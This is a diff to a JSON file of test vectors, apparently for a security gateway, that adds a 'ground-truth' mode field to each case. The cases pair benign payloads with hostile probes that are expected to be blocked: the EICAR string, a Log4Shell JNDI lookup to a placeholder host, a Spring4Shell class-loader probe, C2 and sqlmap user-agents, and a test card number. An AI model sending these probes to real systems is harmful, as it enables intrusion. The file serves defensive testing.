@@ -9,7 +9,8 @@
       "label": "Control canary (benign heartbeat)",
       "threat": "none",
       "payload": "SECV-CANARY benign end-to-end heartbeat",
-      "expect": "arrive"
+      "expect": "arrive",
+      "mode": "ground-truth"
     },
     {
       "id": "benign-article",
@@ -17,7 +18,8 @@
       "label": "Benign web content (article text)",
       "threat": "none",
       "payload": "Quarterly results were in line with guidance and the board approved a dividend.",
-      "expect": "arrive"
+      "expect": "arrive",
+      "mode": "ground-truth"
     },
     {
       "id": "benign-api-json",
@@ -25,7 +27,8 @@
       "label": "Benign API request (normal JSON)",
       "threat": "none",
       "payload": "{\"user\":\"alice\",\"action\":\"login\",\"ok\":true}",
-      "expect": "arrive"
+      "expect": "arrive",
+      "mode": "ground-truth"
     },
     {
       "id": "benign-form-post",
@@ -33,7 +36,8 @@
       "label": "Benign form submission",
       "threat": "none",
       "payload": "name=Jordan&subject=Meeting+notes&body=See+you+at+3pm",
-      "expect": "arrive"
+      "expect": "arrive",
+      "mode": "ground-truth"
     },
     {
       "id": "mal-eicar",
@@ -41,7 +45,8 @@
       "label": "EICAR anti-malware test string",
       "threat": "malware",
       "payload": "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
-      "expect": "block"
+      "expect": "block",
+      "mode": "ground-truth"
     },
     {
       "id": "mal-log4shell",
@@ -49,7 +54,8 @@
       "label": "Log4Shell JNDI probe (CVE-2021-44228)",
       "threat": "exploit",
       "payload": "token=${jndi:ldap://exploit.invalid/a}",
-      "expect": "block"
+      "expect": "block",
+      "mode": "ground-truth"
     },
     {
       "id": "mal-c2-ua",
@@ -57,7 +63,8 @@
       "label": "Malware C2 user-agent",
       "threat": "c2",
       "payload": "User-Agent: BlackSun; beacon=1",
-      "expect": "block"
+      "expect": "block",
+      "mode": "ground-truth"
     },
     {
       "id": "mal-scanner-ua",
@@ -65,7 +72,8 @@
       "label": "Scanner user-agent (sqlmap)",
       "threat": "recon",
       "payload": "User-Agent: sqlmap/1.7#stable (http://sqlmap.org)",
-      "expect": "block"
+      "expect": "block",
+      "mode": "ground-truth"
     },
     {
       "id": "mal-dlp-pan",
@@ -73,7 +81,8 @@
       "label": "Data exfil — synthetic test PAN",
       "threat": "dlp",
       "payload": "card_number=4111111111111111&exp=12/29",
-      "expect": "block"
+      "expect": "block",
+      "mode": "ground-truth"
     },
     {
       "id": "mal-uid-root",
@@ -81,7 +90,8 @@
       "label": "GPL id-check response (uid=0 root)",
       "threat": "recon",
       "payload": "uid=0(root) gid=0(root) groups=0(root)",
-      "expect": "block"
+      "expect": "block",
+      "mode": "ground-truth"
     },
     {
       "id": "mal-spring4shell",
@@ -89,7 +99,9 @@
       "label": "Spring4Shell class-loader probe (sanitizable)",
       "threat": "exploit",
       "payload": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=x",
-      "expect": "block"
+      "expect": "block",
+      "mode": "ground-truth"
     }
-  ]
+  ],
+  "mode": "ground-truth"
 }
